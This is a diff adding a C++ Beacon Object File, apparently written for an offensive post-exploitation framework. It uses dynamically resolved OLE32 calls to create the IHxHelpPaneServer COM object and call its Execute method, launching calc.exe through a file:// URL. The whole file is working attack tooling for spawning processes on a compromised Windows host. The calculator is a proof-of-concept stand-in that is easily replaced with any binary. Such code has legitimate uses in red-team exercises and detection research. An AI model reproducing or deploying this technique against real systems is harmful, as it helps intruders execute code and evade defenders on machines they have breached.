@@ -1,0 +1,170 @@
+#include <Windows.h>
+#include "base\helpers.h"
+
+#ifdef _DEBUG
+#include "base\mock.h"
+#undef DECLSPEC_IMPORT  
+#define DECLSPEC_IMPORT
+#endif
+
+extern "C" {
+#include "beacon.h"
+    DFR(KERNEL32, LoadLibraryA);
+#define LoadLibraryA KERNEL32$LoadLibraryA
+    DFR(KERNEL32, GetLastError);
+#define GetLastError KERNEL32$GetLastError
+
+    struct __declspec(uuid("{8cec592c-07a1-11d9-b15e-000d56bfe6ee}"))
+        IHxHelpPaneServer : public IUnknown {
+        virtual HRESULT __stdcall DisplayTask(PWCHAR) = 0;
+        virtual HRESULT __stdcall DisplayContents(PWCHAR) = 0;
+        virtual HRESULT __stdcall DisplaySearchResults(PWCHAR) = 0;
+        virtual HRESULT __stdcall Execute(const PWCHAR) = 0;
+    };
+
+    DWORD Win32FromHResult(HRESULT Result) {
+        if ((Result & 0xFFFF0000) == MAKE_HRESULT(SEVERITY_ERROR, FACILITY_WIN32, 0))
+            return HRESULT_CODE(Result);
+
+        if (Result == S_OK)
+            return ERROR_SUCCESS;
+
+        return ERROR_CAN_NOT_COMPLETE;
+    }
+
+    HRESULT MyCoInitializeEx(LPVOID pvReserved, DWORD dwCoInit) {
+        typedef HRESULT(WINAPI* pCoInitializeEx)(LPVOID, DWORD);
+        static pCoInitializeEx fnCoInitializeEx = nullptr;
+
+        if (!fnCoInitializeEx) {
+            HMODULE hOle32 = LoadLibraryA("OLE32.dll");
+            if (!hOle32) {
+                return HRESULT_FROM_WIN32(GetLastError());
+            }
+
+            fnCoInitializeEx = (pCoInitializeEx)GetProcAddress(hOle32, "CoInitializeEx");
+            if (!fnCoInitializeEx) {
+                return HRESULT_FROM_WIN32(GetLastError());
+            }
+        }
+
+        return fnCoInitializeEx(pvReserved, dwCoInit);
+    }
+
+    HRESULT MyCoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv) {
+        typedef HRESULT(WINAPI* pCoCreateInstance)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
+        static pCoCreateInstance fnCoCreateInstance = nullptr;
+
+        if (!fnCoCreateInstance) {
+            HMODULE hOle32 = LoadLibraryA("OLE32.dll");
+            if (!hOle32) {
+                return HRESULT_FROM_WIN32(GetLastError());
+            }
+
+            fnCoCreateInstance = (pCoCreateInstance)GetProcAddress(hOle32, "CoCreateInstance");
+            if (!fnCoCreateInstance) {
+                return HRESULT_FROM_WIN32(GetLastError());
+            }
+        }
+
+        return fnCoCreateInstance(rclsid, pUnkOuter, dwClsContext, riid, ppv);
+    }
+
+    HRESULT MyCLSIDFromString(LPCWSTR lpsz, LPCLSID pclsid) {
+        typedef HRESULT(WINAPI* pCLSIDFromString)(LPCWSTR, LPCLSID);
+        static pCLSIDFromString fnCLSIDFromString = nullptr;
+
+        if (!fnCLSIDFromString) {
+            HMODULE hOle32 = LoadLibraryA("OLE32.dll");
+            if (!hOle32) {
+                return HRESULT_FROM_WIN32(GetLastError());
+            }
+
+            fnCLSIDFromString = (pCLSIDFromString)GetProcAddress(hOle32, "CLSIDFromString");
+            if (!fnCLSIDFromString) {
+                return HRESULT_FROM_WIN32(GetLastError());
+            }
+        }
+
+        return fnCLSIDFromString(lpsz, pclsid);
+    }
+
+    void MyCoUninitialize() {
+        typedef void(WINAPI* pCoUninitialize)();
+        static pCoUninitialize fnCoUninitialize = nullptr;
+
+        if (!fnCoUninitialize) {
+            HMODULE hOle32 = LoadLibraryA("OLE32.dll");
+            if (!hOle32) {
+                return;
+            }
+
+            fnCoUninitialize = (pCoUninitialize)GetProcAddress(hOle32, "CoUninitialize");
+            if (!fnCoUninitialize) {
+                return;
+            }
+        }
+
+        fnCoUninitialize();
+    }
+
+    HRESULT CoInitializeIHxHelpIds(LPGUID Clsid, LPGUID Iid) {
+        HRESULT Result = S_OK;
+
+        if (!SUCCEEDED(Result = MyCLSIDFromString(L"{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}", Clsid)))
+            return Result;
+
+        if (!SUCCEEDED(Result = MyCLSIDFromString(L"{8cec592c-07a1-11d9-b15e-000d56bfe6ee}", Iid)))
+            return Result;
+
+        return Result;
+    }
+
+    DWORD ComSpawn() {
+        HRESULT Result = S_OK;
+        GUID CLSID_IHxHelpPaneServer;
+        GUID IID_IHxHelpPaneServer;
+        WCHAR pcUrl[256] = L"file:///C:/WINDOWS/SYSTEM32/CALC.EXE";
+        IHxHelpPaneServer* Help = nullptr;
+
+        if (!SUCCEEDED(Result = CoInitializeIHxHelpIds(&CLSID_IHxHelpPaneServer, &IID_IHxHelpPaneServer))) {
+            return Win32FromHResult(Result);
+        }
+
+        if (!SUCCEEDED(Result = MyCoInitializeEx(NULL, COINIT_MULTITHREADED))) {
+            return Win32FromHResult(Result);
+        }
+
+        if (!SUCCEEDED(Result = MyCoCreateInstance(CLSID_IHxHelpPaneServer, NULL, CLSCTX_ALL, IID_IHxHelpPaneServer, (PVOID*)&Help))) {
+            MyCoUninitialize();
+            return Win32FromHResult(Result);
+        }
+
+        Result = Help->Execute(pcUrl);
+        if (FAILED(Result)) {
+        }
+        else {
+        }
+
+        if (Help)
+            Help->Release();
+
+        MyCoUninitialize();
+        return Win32FromHResult(Result);
+    }
+
+    void go(char* args, int len) {
+        ComSpawn();
+    }
+}
+
+#if defined(_DEBUG) && !defined(_GTEST)
+
+int main(int argc, char* argv[]) {
+    bof::runMocked<>(go);
+    return 0;
+}
+
+#elif defined(_GTEST)
+#include <gtest\gtest.h>
+#endif
